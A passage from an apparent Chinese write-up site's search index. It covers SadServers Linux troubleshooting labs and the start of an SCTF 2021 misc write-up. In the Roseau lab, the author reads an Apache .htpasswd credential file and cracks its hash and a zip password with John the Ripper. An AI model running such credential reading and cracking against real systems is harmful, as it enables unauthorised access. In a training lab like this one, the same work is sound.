/home/admin/somefile\n</code></pre> ps -aux \u627e\u4e00\u901a\u53d1\u73b0\u8fd9\u4e2a PID \u5c31\u662f\u5f53\u524d\u7684 shell\u3002</p> <p>somefile \u65c1\u8fb9\u8fd8\u6709\u4e00\u4e2a openfile.sh\uff0c\u5185\u5bb9\u4e3a\uff1a <pre><code>#!/bin/bash\nexec 66&gt; /home/admin/somefile\n</code></pre> \u53ef\u4ee5\u63a8\u6d4b\u662f\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u6253\u5f00\u7684\u6587\u4ef6\u3002\u901a\u8fc7\u524d\u9762 lsof \u7684\u7ed3\u679c\u77e5\u9053\u8fd9\u4e2a\u6587\u4ef6\u7684 fd \u4e3a 77\uff0c\u6216\u8005\u53ef\u4ee5\u901a\u8fc7 proc \u6765\u9a8c\u8bc1\u4e00\u4e0b\uff1a <pre><code>$ ls -l /proc/self/fd\ntotal 0\nlrwx------ 1 admin admin 64 Dec 24 04:47 0 -&gt; /dev/pts/0\nlrwx------ 1 admin admin 64 Dec 24 04:47 1 -&gt; /dev/pts/0\nlrwx------ 1 admin admin 64 Dec 24 04:47 2 -&gt; /dev/pts/0\nlr-x------ 1 admin admin 64 Dec 24 04:47 3 -&gt; /proc/819/fd\nl-wx------ 1 admin admin 64 Dec 24 04:47 77 -&gt; /home/admin/somefile\n</code></pre> \u7136\u540e\u540c\u6837\u4f7f\u7528 exec \u5173\u6389 77 fd \u5c31\u597d\u4e86\uff1a <pre><code>$ exec 77&gt;&amp;-\n</code></pre></p>"}, {"location": "writeups/sadservers/#melbourne", "title": "\"Melbourne\"", "text": "<p>Scenario: \"Melbourne\": WSGI with Gunicorn</p> <p>Level: Medium</p> <p>Description: There is a Python WSGI web application file at /home/admin/wsgi.py , the purpose of which is to serve the string \"Hello, world!\". This file is served by a Gunicorn server which is fronted by an nginx server (both servers managed by systemd). So the flow of an HTTP request is: Web Client (curl) -&gt; Nginx -&gt; Gunicorn -&gt; wsgi.py . The objective is to be able to curl the localhost (on default port :80) and get back \"Hello, world!\", using the current setup.</p> <p>OS: Debian 11</p> <p>\u9996\u5148 curl -v http://localhost \u770b\u4e00\u4e0b\uff0c\u53d1\u73b0 Connection refused\uff1a <pre><code>admin@ip-172-31-32-71:~$ curl -v http://localhost\n*   Trying 127.0.0.1:80...\n* connect to 127.0.0.1 port 80 failed: Connection refused\n* Failed to connect to localhost port 80: Connection refused\n* Closing connection 0\ncurl: (7) Failed to connect to localhost port 80: Connection refused\n</code></pre> \u67e5\u8be2\u4e00\u4e0b nginx \u72b6\u6001\uff0c\u53d1\u73b0\u662f\u6ca1\u6709\u5f00\u542f\uff0c\u6240\u4ee5 sudo \u91cd\u542f\uff1a <pre><code>admin@ip-172-31-32-71:~$ systemctl status nginx\n\u25cf nginx.service - A high performance web server and a reverse proxy server\n     Loaded: loaded (/lib/systemd/system/nginx.service; disabled; vendor preset:&gt;\n     Active: inactive (dead)\n       Docs: man:nginx(8)\nadmin@ip-172-31-32-71:~$ sudo systemctl start nginx\nadmin@ip-172-31-32-71:~$ systemctl status nginx.service\n\u25cf nginx.service - A high performance web server and a reverse proxy server\n     Loaded: loaded (/lib/systemd/system/nginx.service; disabled; vendor preset: enabled)\n     Active: active (running) since Sat 2022-12-24 05:09:46 UTC; 3s ago\n       Docs: man:nginx(8)\n    Process: 850 ExecStartPre=/usr/sbin/nginx -t -q -g daemon on; master_process on; (code=exited, status=0/SUCCESS)\n    Process: 851 ExecStart=/usr/sbin/nginx -g daemon on; master_process on; (code=exited, status=0/SUCCESS)\n   Main PID: 852 (nginx)\n      Tasks: 3 (limit: 524)\n     Memory: 3.1M\n        CPU: 36ms\n     CGroup: /system.slice/nginx.service\n             \u251c\u2500852 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;\n             \u251c\u2500853 nginx: worker process\n             \u2514\u2500854 nginx: worker process\n</code></pre> \u53ef\u4ee5\u6b63\u5e38\u91cd\u542f\uff0c\u4f46\u8fd9\u65f6 curl \u4f1a\u51fa\u73b0 502\u3002\u770b\u4e00\u4e0b /etc/nginx/sites-enabled/default \u91cc\u7684\u914d\u7f6e\uff1a <pre><code>server {\n    listen 80;\n\n    location / {\n        include proxy_params;\n        proxy_pass http://unix:/run/gunicorn.socket;\n    }\n}\n</code></pre> \u53d1\u73b0\u53ea\u6709 proxy_pass \u90a3\u53e5\u53ef\u80fd\u51fa\u95ee\u9898\u3002systemctl \u67e5\u8be2\u4e00\u4e0b gunicorn \u72b6\u6001\uff1a <pre><code>admin@ip-172-31-32-71:~$ systemctl status gunicorn\n\u25cf gunicorn.service - gunicorn daemon\n     Loaded: loaded (/etc/systemd/system/gunicorn.service; enabled; vendor preset: enabled)\n     Active: active (running) since Sat 2022-12-24 05:01:16 UTC; 10min ago\nTriggeredBy: \u25cf gunicorn.socket\n   Main PID: 550 (gunicorn)\n      Tasks: 2 (limit: 524)\n     Memory: 17.1M\n        CPU: 348ms\n     CGroup: /system.slice/gunicorn.service\n             \u251c\u2500550 /usr/bin/python3 /usr/local/bin/gunicorn --bind unix:/run/gunicorn.sock wsgi\n             \u2514\u2500612 /usr/bin/python3 /usr/local/bin/gunicorn --bind unix:/run/gunicorn.sock wsgi\n\nDec 24 05:01:16 ip-172-31-32-71 systemd[1]: Started gunicorn daemon.\nDec 24 05:01:17 ip-172-31-32-71 gunicorn[550]: [2022-12-24 05:01:17 +0000] [550] [INFO] Starting gunicorn 20.1.0\nDec 24 05:01:17 ip-172-31-32-71 gunicorn[550]: [2022-12-24 05:01:17 +0000] [550] [INFO] Listening at: unix:/run/gunicorn.sock (550)\nDec 24 05:01:17 ip-172-31-32-71 gunicorn[550]: [2022-12-24 05:01:17 +0000] [550] [INFO] Using worker: sync\nDec 24 05:01:17 ip-172-31-32-71 gunicorn[612]: [2022-12-24 05:01:17 +0000] [612] [INFO] Booting worker with pid: 612\n</code></pre> \u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u4e0a\u662f\u7ed1\u5b9a\u5728 /run/gunicorn.sock \u4e0a\u4e86\uff0c/run/gunicorn.socket \u5e76\u4e0d\u5b58\u5728\u3002\u6240\u4ee5\u4fee\u6539 nginx \u7684\u914d\u7f6e\u7136\u540e restart\u3002\u8fd9\u65f6 curl \u4e0d\u4f1a\u62a5\u9519\uff0c\u4f46\u6ca1\u6709\u5185\u5bb9\uff0c-v \u8f93\u51fa\uff1a <pre><code>admin@ip-172-31-32-71:~$ curl -v http://localhost\n*   Trying 127.0.0.1:80...\n* Connected to localhost (127.0.0.1) port 80 (#0)\n&gt; GET / HTTP/1.1\n&gt; Host: localhost\n&gt; User-Agent: curl/7.74.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Server: nginx/1.18.0\n&lt; Date: Sat, 24 Dec 2022 05:13:05 GMT\n&lt; Content-Type: text/html\n&lt; Content-Length: 0\n&lt; Connection: keep-alive\n&lt; \n* Connection #0 to host localhost left intact\n</code></pre> \u53ef\u4ee5\u770b\u5230\u662f 200\uff0c\u4f46\u8fd9\u91cc Response \u91cc\u6709 Content-Length: 0\uff0c\u6240\u4ee5\u4ec0\u4e48\u90fd\u6ca1\u5f97\u5230\u3002\u53d1\u73b0\u8fd9\u4e2a\u662f\u5199\u5728 wsgi.py \u91cc\u7684\uff1a <pre><code>admin@ip-172-31-32-71:~$ cat wsgi.py \ndef application(environ, start_response):\n    start_response('200 OK', [('Content-Type', 'text/html'), ('Content-Length', '0'), ])\n    return [b'Hello, world!']\n</code></pre> \u6240\u4ee5\u628a ('Content-Length', '0') \u53bb\u6389\uff0c\u7136\u540e sudo systemctl restart gunicorn \u91cd\u542f\uff0c\u8fd9\u6b21\u518d curl \u5c31\u6b63\u5e38\u4e86\uff1a <pre><code>admin@ip-172-31-32-71:~$ curl -s http://localhost\nHello, world!\n</code></pre></p>"}, {"location": "writeups/sadservers/#lisbon", "title": "\"Lisbon\"", "text": "<p>Scenario: \"Lisbon\": etcd SSL cert troubles</p> <p>Level: Medium</p> <p>Description: There's an etcd server running on https://localhost:2379 , get the value for the key \"foo\", ie <code>etcdctl get foo</code> or <code>curl https://localhost:2379/v2/keys/foo</code></p> <p>OS: Debian 11</p> <p>\u9996\u5148\u8dd1\u4e00\u4e0b <code>etcdctl get goo</code> \u8bd5\u8bd5\u770b\uff0c\u5f97\u5230\u62a5\u9519\uff1a <pre><code>admin@ip-10-0-0-138:/$ etcdctl get foo\nError:  client: etcd cluster is unavailable or misconfigured; error #0: x509: certificate has expired or is not yet valid: current time 2024-02-20T02:49:48Z is after 2023-01-30T00:02:48Z\n\nerror #0: x509: certificate has expired or is not yet valid: current time 2024-02-20T02:49:48Z is after 2023-01-30T00:02:48Z\n</code></pre></p> <p>\u53ef\u89c1\u662f\u8bc1\u4e66\u8fc7\u671f\u4e86\uff0c\u800c\u4e14\u5f53\u524d\u65f6\u95f4\u662f\u5728 24 \u5e74\uff0c\u76f4\u63a5 <code>sudo date -s 20230101</code> \u4fee\u6539\u65e5\u671f\u5230\u8bc1\u4e66\u8fc7\u671f\u524d\u5c31\u53ef\u4ee5\u3002</p> <p>\u63a5\u7740\u518d\u8fd0\u884c\u53ef\u4ee5\u5f97\u5230\uff1a <pre><code>admin@ip-10-0-0-138:/$ etcdctl get foo\nError:  client: response is invalid json. The endpoint is probably not valid etcd cluster endpoint.\nadmin@ip-10-0-0-138:/$ curl https://localhost:2379/v2/keys/foo\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;\n&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre></p> <p>\u8fd9\u4e2a curl \u7684 404 \u7ed3\u679c\u662f nginx \u7684\u5c31\u6bd4\u8f83\u602a\uff0c\u6240\u4ee5 curl \u4e86\u4e00\u4e0b\u6839\u9875\u9762\uff1a <pre><code>admin@ip-10-0-0-138:/$ curl https://localhost:2379/\nTesting SSL\nadmin@ip-10-0-0-138:/$ curl https://localhost:443/\nTesting SSL\nadmin@ip-10-0-0-138:/$ cat /var/www/html/index.html \nTesting SSL\n</code></pre></p> <p>\u53ef\u4ee5\u731c\u6d4b 2379 \u7aef\u53e3\u88ab\u91cd\u5b9a\u5411\u5230 nginx \u7684 443 \u7aef\u53e3\u4e0a\u4e86\uff0c\u770b\u4e86\u4e0b <code>/etc/nginx/sites-enabled/default</code> \u5e76\u6ca1\u6709 2379 \u7aef\u53e3\u76f8\u5173\u8bbe\u7f6e\uff0cnetstat \u4e5f\u53ea\u53ef\u4ee5\u770b\u5230\u5360\u7528\u60c5\u51b5\uff0c2379 \u786e\u5b9e\u5728\u7528\u3002\u63a5\u4e0b\u6765\u770b\u770b iptables\uff1a <pre><code>admin@ip-10-0-0-138:/$ sudo iptables -t nat -L\nChain PREROUTING (policy ACCEPT)\ntarget     prot opt source               destination         \nDOCKER     all  --  anywhere             anywhere             ADDRTYPE match dst-type LOCAL\n\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nREDIRECT   tcp  --  anywhere             anywhere             tcp dpt:2379 redir ports 443\nDOCKER     all  --  anywhere            !ip-127-0-0-0.us-east-2.compute.internal/8  ADDRTYPE match dst-type LOCAL\n\nChain POSTROUTING (policy ACCEPT)\ntarget     prot opt source               destination         \nMASQUERADE  all  --  ip-172-17-0-0.us-east-2.compute.internal/16  anywhere            \n\nChain DOCKER (2 references)\ntarget     prot opt source               destination         \nRETURN     all  --  anywhere             anywhere\n</code></pre> \u53ef\u4ee5\u53d1\u73b0 <code>tcp dpt:2379 redir ports 443</code>\uff0c\u6240\u4ee5\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u76f4\u63a5 -F flush \u6389\u8fd9\u4e9b rules \u5c31\u597d\uff1a <pre><code>admin@ip-10-0-0-138:/$ sudo iptables -t nat -F       \nadmin@ip-10-0-0-138:/$ etcdctl get foo\nbar\nadmin@ip-10-0-0-138:/$ curl https://localhost:2379/v2/keys/foo\n{\"action\":\"get\",\"node\":{\"key\":\"/foo\",\"value\":\"bar\",\"modifiedIndex\":4,\"createdIndex\":4}}\n</code></pre></p>"}, {"location": "writeups/sadservers/#pokhara", "title": "\"Pokhara\"", "text": "<p>Scenario: \"Pokhara\": SSH and other sshenanigans</p> <p>Level: Hard</p> <p>Description: A user <code>client</code> was added to the server, as well as their SSH public key. The objective is to be able to SSH locally (there's only one server) as this user client using their ssh keys. This is, if as root you change to this user <code>sudo su; su client</code>, you should be able to login with ssh: <code>ssh localhost</code>.</p> <p>OS: Debian 11</p> <p>\u9996\u5148\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u8fde\u5207\u6362\u5230 client \u7528\u6237\u90fd\u4e0d\u53ef\u4ee5\uff1a <pre><code>admin@ip-172-31-33-16:/$ sudo su\nroot@ip-172-31-33-16:/# su client\nYour account has expired; please contact your system administrator.\n</code></pre></p> <p>\u7528\u6237\u8fc7\u671f\u4e86\uff0c\u90a3\u5c31\u5ef6\u4e00\u4e0b\uff1a <pre><code>admin@ip-172-31-33-16:/$ sudo chage -l client\nLast password change                                    : Feb 05, 2023\nPassword expires                                        : never\nPassword inactive                                       : never\nAccount expires                                         : Jan 01, 1970\nMinimum number of days between password change          : 0\nMaximum number of days between password change          : 99999\nNumber of days of warning before password expires       : 7\nadmin@ip-172-31-33-16:/$ sudo usermod -e 2024-01-01 client\nadmin@ip-172-31-33-16:/$ sudo chage -l client\nLast password change                                    : Feb 05, 2023\nPassword expires                                        : never\nPassword inactive                                       : never\nAccount expires                                         : Jan 01, 2024\nMinimum number of days between password change          : 0\nMaximum number of days between password change          : 99999\nNumber of days of warning before password expires       : 7\n</code></pre></p> <p>\u518d\u6b21\u767b\u9646\uff0c\u51fa\u73b0\u62a5\u9519\uff1a <pre><code>root@ip-172-31-33-16:/# su client\nsu: failed to execute /usr/sbin/nologin: Resource temporarily unavailable\n</code></pre> \u5b83\u8bd5\u56fe\u6267\u884c <code>/usr/sbin/nologin</code>\uff0c\u4f46\u662f\u6b63\u5e38\u6765\u8bb2\u5e94\u8be5\u662f\u4e00\u4e2a shell\uff0c\u6240\u4ee5\u6539\u4e00\u4e0b\u5148\uff0c\u4f46\u4ecd\u7136\u4f1a\u51fa\u73b0\u62a5\u9519\uff1a <pre><code>root@ip-172-31-33-16:/# lslogins client\n...                 \nShell:                              /usr/sbin/nologin                   \n...\nroot@ip-172-31-33-16:/# usermod --shell /bin/bash client\nroot@ip-172-31-33-16:/# lslogins client\n...\nShell:                              /bin/bash                           \n...\nroot@ip-172-31-33-16:/# su client\nsu: failed to execute /bin/bash: Resource temporarily unavailable\n</code></pre></p> <p>\u641c\u7d22\u4e86\u89e3\u5230\u53ef\u80fd\u662f\u767b\u9646\u6570\u91cf\u88ab\u9650\u5236\u4e86\uff0c\u5728 <code>/etc/security/limits.conf</code> \u4e2d\u53d1\u73b0\uff1a <pre><code>client          hard    nproc           0\n</code></pre> \u6ce8\u91ca\u6389\u8fd9\u4e00\u884c\uff0c\u53ef\u4ee5\u767b\u9646 client \u7528\u6237\u4e86\uff0c\u4f46\u662f ssh \u8fd8\u6709\u95ee\u9898\uff1a <pre><code>root@ip-172-31-33-16:/# su client\nclient@ip-172-31-33-16:/$ ssh localhost\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!\nSomeone could be eavesdropping on you right now (man-in-the-middle attack)!\nIt is also possible that a host key has just been changed.\nThe fingerprint for the ECDSA key sent by the remote host is\nSHA256:nfWAp8P5xQ+rJbfolHi8/jTpKNa+DlN1MXv1Wwus+4M.\nPlease contact your system administrator.\nAdd correct host key in /home/client/.ssh/known_hosts to get rid of this message.\nOffending ECDSA key in /home/client/.ssh/known_hosts:1\n  remove with:\n  ssh-keygen -f \"/home/client/.ssh/known_hosts\" -R \"localhost\"\nECDSA host key for localhost has changed and you have requested strict checking.\nHost key verification failed.\n</code></pre> \u6839\u636e\u6307\u5bfc\uff0c\u5728 client \u7528\u6237\u4e0b\u6267\u884c ssh-keygen\uff1a <pre><code>client@ip-172-31-33-16:/$ ssh-keygen -f \"/home/client/.ssh/known_hosts\" -R \"localhost\"\n# Host localhost found: line 1\n/home/client/.ssh/known_hosts updated.\nOriginal contents retained as /home/client/.ssh/known_hosts.old\nclient@ip-172-31-33-16:/$ ssh localhost\nThe authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:nfWAp8P5xQ+rJbfolHi8/jTpKNa+DlN1MXv1Wwus+4M.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added 'localhost' (ECDSA) to the list of known hosts.\nclient@localhost: Permission denied (publickey).\n</code></pre></p> <p>\u53c8 Permission denied\uff0c\u6240\u4ee5\u53bb\u67e5\u4e00\u4e0b ssh \u7684\u914d\u7f6e\u6587\u4ef6\uff1a <pre><code>root@ip-172-31-33-16:/# cat /etc/ssh/sshd_config.d/sad.conf\nDenyUsers client\n</code></pre> \u5220\u6389\u8fd9\u4e00\u884c\uff0c<code>systemctl restart ssh</code> \u91cd\u542f\u670d\u52a1\uff0c\u518d\u6b21\u5c1d\u8bd5\uff0c\u5f97\u5230\uff1a <pre><code>client@ip-172-31-33-16:/$ ssh localhost\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nPermissions 0644 for '/home/client/.ssh/id_rsa' are too open.\nIt is required that your private key files are NOT accessible by others.\nThis private key will be ignored.\nLoad key \"/home/client/.ssh/id_rsa\": bad permissions\nclient@localhost: Permission denied (publickey).\nclient@ip-172-31-33-16:/$ ls -l /home/client/.ssh/id_rsa\n-rw-r--r-- 1 client client 2610 Feb  5 22:33 /home/client/.ssh/id_rsa\n</code></pre> \u5b83\u544a\u8bc9\u6211\u4eec id_rsa \u7684\u6743\u9650\u592a\u5927\u4e86\uff0c\u56e0\u6b64\u7ed9 group \u548c others \u7684 r \u6743\u9650\u90fd\u53bb\u6389\uff1a <pre><code>client@ip-172-31-33-16:/$ chmod g-r /home/client/.ssh/id_rsa\nclient@ip-172-31-33-16:/$ chmod o-r /home/client/.ssh/id_rsa\n</code></pre> \u5373\u53ef\u6b63\u5e38 ssh \u767b\u9646\uff1a <pre><code>client@ip-172-31-33-16:/$ ssh localhost\nLinux ip-172-31-33-16 5.10.0-14-cloud-amd64 #1 SMP Debian 5.10.113-1 (2022-04-29) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Feb  5 23:00:41 2023 from 127.0.0.1\n</code></pre></p>"}, {"location": "writeups/sadservers/#roseau", "title": "\"Roseau\"", "text": "<p>Scenario: \"Roseau\": Hack a Web Server</p> <p>Level: Hard</p> <p>Description: There is a secret stored in a file that the local Apache web server can provide. Find this secret and have it as a /home/admin/secret.txt file.</p> <p>Note that in this server the admin user is not a sudoer.</p> <p>Also note that the password crackers Hashcat and Hydra are installed from packages and John the Ripper binaries have been built from source in /home/admin/john/run.</p> <p>OS: Debian 11</p> <p>Sadservers \u4e0a\u7b2c\u4e00\u9053 Hack \u7c7b\u9898\u76ee\u7684\u9898\uff0c\u4e0d\u8fc7\u770b\u8d77\u6765\u76ee\u7684\u4e5f\u5f88\u660e\u786e\uff0c\u533a\u522b\u57fa\u672c\u5c31\u662f\u6ca1\u6709 root \u6743\u9650\uff0c\u9700\u8981\u7ed5\u8fc7\u3001\u7834\u89e3\u7b49\u3002</p> <p>\u65e2\u7136\u6709\u4e00\u4e2a Apache \u670d\u52a1\uff0c\u90a3\u5c31\u5148 curl \u4e00\u4e0b localhost\uff1a <pre><code>admin@ip-172-31-34-168:~$ curl localhost\n&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;401 Unauthorized&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;Unauthorized&lt;/h1&gt;\n&lt;p&gt;This server could not verify that you\nare authorized to access the document\nrequested.  Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.&lt;/p&gt;\n&lt;hr&gt;\n&lt;address&gt;Apache/2.4.54 (Debian) Server at localhost Port 80&lt;/address&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre> \u9700\u8981\u8ba4\u8bc1\uff0c\u800c Apache \u7684\u914d\u7f6e\u6587\u4ef6\u662f\u53ef\u4ee5\u76f4\u63a5\u770b\u5230\u7684\uff1a <pre><code>admin@ip-172-31-34-168:/$ cat /etc/apache2/sites-enabled/000-default.conf\n&lt;VirtualHost *:80&gt;\n        ServerAdmin webmaster@localhost\n        DocumentRoot /var/www/html\n        ErrorLog ${APACHE_LOG_DIR}/error.log\n        CustomLog ${APACHE_LOG_DIR}/access.log combined\n\n\n        &lt;Directory \"/var/www/html\"&gt;\n                AuthType Basic\n                AuthName \"Protected Content\"\n                AuthUserFile /etc/apache2/.htpasswd\n                Require valid-user\n        &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n</code></pre> \u6240\u4ee5\u6574\u4e2a\u76ee\u5f55\u90fd\u88ab\u4fdd\u62a4\u4e86\uff0c\u4f7f\u7528 <code>/etc/apache2/.htpasswd</code> \u4e2d\u7684\u8d26\u53f7\u5bc6\u7801\u624d\u80fd\u8bbf\u95ee\u3002\u800c\u8fd9\u4e2a\u6587\u4ef6\u6211\u4eec\u4e5f\u662f\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u7684\uff1a <pre><code>admin@ip-172-31-34-168:/$ cat /etc/apache2/.htpasswd\ncarlos:$apr1$b1kyfnHB$yRHwzbuKSMyW62QTnGYCb0\n</code></pre> \u9898\u76ee\u91cc\u8bf4\u4e86\u63d0\u4f9b\u4e86 John the Ripper\uff0c\u641c\u4e00\u4e0b\u53ef\u4ee5\u77e5\u9053\u8fd9\u662f\u4e2a\u7834\u89e3\u5bc6\u7801\u7684\u5de5\u5177\uff0c\u76f4\u63a5\u628a .htpasswd \u6587\u4ef6\u4e22\u8fdb\u53bb\uff1a <pre><code>admin@ip-172-31-34-168:/$ cd ~/john/run/\nadmin@ip-172-31-34-168:~/john/run$ ./john /etc/apache2/.htpasswd\nWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"\nUse the \"--format=md5crypt-long\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])\nWill run 2 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status\nWarning: Only 34 candidates buffered for the current salt, minimum 48 needed for performance.\nAlmost done: Processing the remaining buffered candidate passwords, if any.\n0g 0:00:00:00 DONE 1/3 (2023-02-20 03:59) 0g/s 9527p/s 9527c/s 9527C/s Carlos1921..Carlos1900\nProceeding with wordlist:./password.lst\nEnabling duplicate candidate password suppressor\nchalet           (carlos)     \n1g 0:00:00:01 DONE 2/3 (2023-02-20 03:59) 0.6097g/s 40560p/s 40560c/s 40560C/s 050381..song\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> \u5f97\u5230\u7528\u6237 carlos \u7684\u5bc6\u7801 chalet\uff0c\u7136\u540e\u901a\u8fc7 -u \u9009\u9879\u6765 curl\uff1a <pre><code>admin@ip-172-31-34-168:~/john/run$ curl -u carlos:chalet localhost\n&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;\n&lt;html&gt;\n &lt;head&gt;\n  &lt;title&gt;Index of /&lt;/title&gt;\n &lt;/head&gt;\n &lt;body&gt;\n&lt;h1&gt;Index of /&lt;/h1&gt;\n ...\n&lt;/body&gt;&lt;/html&gt;\n</code></pre> \u53ef\u4ee5\u6210\u529f\u8ba4\u8bc1\uff0c\u7136\u540e\u5217\u4e00\u4e0b <code>/var/www/html</code> \u7684\u5185\u5bb9\uff0c\u53d1\u73b0\u6709\u4e00\u4e2a webfile\uff0ccurl \u4e0b\u6765\uff1a <pre><code>admin@ip-172-31-34-168:~/john/run$ ls /var/www/html/\nwebfile\nadmin@ip-172-31-34-168:~/john/run$ curl -u carlos:chalet localhost/webfile\nWarning: Binary output can mess up your terminal. Use \"--output -\" to tell \nWarning: curl to output it to your terminal anyway, or consider \"--output \nWarning: &lt;FILE&gt;\" to save to a file.\nadmin@ip-172-31-34-168:~/john/run$ curl -u carlos:chalet localhost/webfile --output ~/secret\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   215  100   215    0     0   104k      0 --:--:-- --:--:-- --:--:--  104k\n</code></pre> file \u4e00\u4e0b\u53d1\u73b0 secret \u662f\u4e2a zip\uff0c\u4f46 unzip \u9700\u8981\u5bc6\u7801\uff1a <pre><code>admin@ip-172-31-34-168:~$ file secret\nsecret: Zip archive data, at least v1.0 to extract\nadmin@ip-172-31-34-168:~$ unzip secret\nArchive:  secret\n[secret] secret.txt password:\n</code></pre> \u540c\u6837\u53ef\u4ee5\u4f7f\u7528 John the Ripper \u6765\u7834\u89e3\uff1a <pre><code>admin@ip-172-31-34-168:~$ john/run/zip2john secret &gt; secret.passwd\nver 1.0 efh 5455 efh 7875 secret/secret.txt PKZIP Encr: 2b chk, TS_chk, cmplen=29, decmplen=17, crc=AAC6E9AF ts=14E0 cs=14e0 type=0\nadmin@ip-172-31-34-168:~$ john/run/john secret.passwd \nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 2 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status\nAlmost done: Processing the remaining buffered candidate passwords, if any.\n0g 0:00:00:00 DONE 1/3 (2023-02-20 04:03) 0g/s 470700p/s 470700c/s 470700C/s Txtsecret/secret.txt1900..Tsecret1900\nProceeding with wordlist:john/run/password.lst\nEnabling duplicate candidate password suppressor\nandes            (secret/secret.txt)     \n1g 0:00:00:00 DONE 2/3 (2023-02-20 04:03) 2.777g/s 1529Kp/s 1529Kc/s 1529KC/s poussinet..nisa1234\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \nadmin@ip-172-31-34-168:~$ unzip secret\nArchive:  secret\n[secret] secret.txt password: andes\n extracting: secret.txt              \nadmin@ip-172-31-34-168:~$ ls\nagent  john  secret  secret.passwd  secret.txt\nadmin@ip-172-31-34-168:~$ cat secret.txt\nRoseau, Dominica\nadmin@ip-172-31-34-168:~$ sha1sum /home/admin/secret.txt |awk '{print $1}'\ncc2c322fbcac56923048d083b465901aac0fe8f8\n</code></pre></p>"}, {"location": "writeups/sctf2021/", "title": "SCTF 2021 Writeup", "text": "<p> \u7ea6 347 \u4e2a\u5b57  112 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u573a\u6bd4\u8d5b\u7684 misc \u8303\u56f4\u6bd4\u8f83\u5e7f\uff0c\u6709\u533a\u5757\u94fe\u6709\u7269\u8054\u7f51\u8fd8\u6709\u9006\u5411\uff0c\u8fd9\u91cc\u5c31\u653e\u4e00\u4e0b\u4e09\u9053\u201c\u5e38\u89c4\u201d\u7684 misc \u7684 writeup \u4e86</p>"}, {"location": "writeups/sctf2021/#this_is_a_tree", "title": "This_is_A_tree", "text": "<p>\u904d\u5386\u6587\u4ef6\u5939\u6811\uff0c\u5f97\u5230\u4e00\u4e32 base64\uff0c\u7136\u540e\u662f\u516d\u5341\u56db\u5366\u8f6c base64 \u7136\u540e\u89e3\u7801</p> <pre><code>from base64 import *\nimport os\nimport string\n\ndef read(path):\n    return open(path, \"r\").read()\n\nres = []\nl = \"letf/\"\nr = \"Right/\"\n\ndef readdir(path):\n    if os.path.isfile(path + \"data\"):\n        res.append(path + \"data\")\n    if os.path.isdir(path + l):\n        readdir(path + l)\n    if os.path.isdir(path + r):\n        readdir(path + r)\n\ndef get_tree():\n    readdir(\"./src/\")\n    s = \"\"\n    for i in res:\n        s += read(i)\n    print(b64decode(s).decode())\n\n# Chinese traditional culture is broad and profound! \n# So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:\n# \u5e08  \u5151 \u590d \u635f  \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b \n\nb64table = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'\ntable = {\n    '\u5764': '000000', '\u5265': '000001', '\u6bd4': '000010', '\u89c2': '000011', \n    '\u8c6b': '000100', '\u664b': '000101', '\u8403': '000110', '\u5426': '000111', \n    '\u8c26': '001000', '\u826e': 